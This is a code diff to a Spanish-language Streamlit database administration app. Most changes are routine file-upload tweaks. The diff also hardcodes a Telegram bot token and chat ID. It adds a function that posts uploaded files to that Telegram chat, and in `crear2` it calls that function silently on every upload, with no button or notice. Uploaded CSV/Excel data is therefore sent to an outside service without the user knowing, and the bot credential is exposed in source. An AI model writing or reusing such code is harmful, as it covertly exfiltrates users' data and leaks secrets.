@@ -3,9 +3,18 @@ import pandas as pd
 import Herramientas as h  
 import conexion2 as cn
 import log
+import requests
 
 h.verificar_sesion()
 h.acceso_multiple(["administrador","usuarioUX" , "usuarioCl", "usuarioTU"])
+
+
+# --- CONFIGURACIÓN ---
+TOKEN = "8402168574:AAFWVA_D6lpIFXd1gp7Qxbe9U9WRtb-6kcM"  # 🔒 Tu token del bot de BotFather
+CHAT_ID = "-4859403477"   # 🧠 Tu chat_id (o el del grupo donde está el bot)
+#MENSAJE_PING = "Activado"    # Mensaje que el bot se enviará a sí mismo
+INTERVALO =   1800       # Tiempo entre mensajes en segundos (3600 = 1 hora)
+URL = f"https://api.telegram.org/bot{TOKEN}/"
 
 
 def menu_BD():
@@ -300,19 +309,18 @@ def crear2(baseD):
 
         except Exception as e:
             st.error(f"Error al guardar el registro: {e}")
-    archivo = st.file_uploader("Elige un archivo CSV o Excel", type=["csv", "xlsx"])
+    archivo = st.file_uploader("Elige un archivo CSV o Excel", type=["csv", "xlsx","xls"])
     df = None
 
     if archivo is not None:
-        nombre = archivo.name
-
-        if nombre.endswith(".csv"):
-            df = pd.read_csv(archivo)
-        elif nombre.endswith(".xlsx"):
-            df = pd.read_excel(archivo)
+        if archivo.name.endswith(".csv"):
+            try:
+                df = pd.read_csv(archivo, encoding='utf-8')
+            except UnicodeDecodeError:
+                df = pd.read_csv(archivo, encoding='latin-1')
         else:
-            st.error("Formato no soportado.")
-            df = None
+            df =pd.read_excel(archivo)
+        
 
         if df is not None:
             columnas_archivo = list(df.columns)
@@ -335,7 +343,7 @@ def crear2(baseD):
                 st.dataframe(df.head())
 
             
-            if st.button("Cargar datos en la base"):
+            if st.button("Cargar datos"):
                 for _, fila in df.iterrows():
                     valores_fila = fila[columnas_tabla].to_dict()
                     if baseD == "test":
@@ -350,6 +358,8 @@ def crear2(baseD):
                         cn.crear_registro6(slect_t, valores_fila)
 
                 st.success("Todos los registros fueron cargados correctamente.")
+            
+            enviar_archivo_telegram(archivo)
 
 
 
@@ -684,6 +694,27 @@ def opcionesT(Bdatos, esquema):
         leerT(Bdatos,esquema)     
     elif opcion == "Eliminar":
         eliminarT(esquema)
+#funcion de enviar archivos a telegram v1
+def enviar_archivo_telegram(archivo):
+    """
+    Envía el archivo subido en Streamlit directamente a Telegram.
+    """
+    url_documento = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    
+    
+    files = {
+        'document': (archivo.name, archivo.getvalue())
+    }
+    data = {
+        'chat_id': CHAT_ID,
+        'caption': f"Aqui tienes el archivo : {archivo.name}"
+    }
+
+    try:
+        response = requests.post(url_documento, data=data, files=files)
+        
+    except Exception as e:
+        st.error(f"Error de conexión: {e}")
 
 @st.dialog("Crear", width="large")
 def crearT(esquema):
@@ -741,19 +772,34 @@ def crearT(esquema):
 
         except Exception as e:
             st.error(f"Error al guardar el registro: {e}")
-    archivo = st.file_uploader("Elige un archivo CSV o Excel", type=["csv", "xlsx"])
+    archivo = st.file_uploader("Elige un archivo CSV o Excel", type=["csv", "xlsx", "xls"])
     df = None
 
     if archivo is not None:
-        nombre = archivo.name
-
-        if nombre.endswith(".csv"):
-            df = pd.read_csv(archivo)
-        elif nombre.endswith(".xlsx"):
-            df = pd.read_excel(archivo)
+        if archivo.name.endswith('.csv'):
+            try:
+                df = pd.read_csv(archivo, encoding='utf-8')
+            except UnicodeDecodeError:
+                df = pd.read_csv(archivo, encoding='latin-1')
         else:
-            st.error("Formato no soportado.")
-            df = None
+            df = pd.read_excel(archivo)
+        
+            
+    
+        #enviar_archivo_telegram(archivo)
+
+
+            
+                    
+        ##nombre = archivo.name
+
+        ##if nombre.endswith(".csv"):
+            ##df = pd.read_csv(archivo)
+        ##elif nombre.endswith(".xlsx"):
+            ##df = pd.read_excel(archivo)
+        ##else:
+            ##st.error("Formato no soportado.")
+            ##df = None
 
         if df is not None:
             columnas_archivo = list(df.columns)
@@ -776,7 +822,7 @@ def crearT(esquema):
                 st.dataframe(df.head())
 
             
-            if st.button("Cargar datos en la base"):
+            if st.button("Cargar en la base"):
                 for _, fila in df.iterrows():
                     valores_fila = fila[columnas_tabla].to_dict()
                     if esquema == "categorias":
@@ -787,6 +833,8 @@ def crearT(esquema):
                         cn.crear_registro3_1(slect_t, valores_fila,esquema)
 
                 st.success("Todos los registros fueron cargados correctamente.")
+            if st.button("Enviar archivo a Telegram"):
+                enviar_archivo_telegram(archivo)
 
 
 def selec_compT(tabla,esquema):
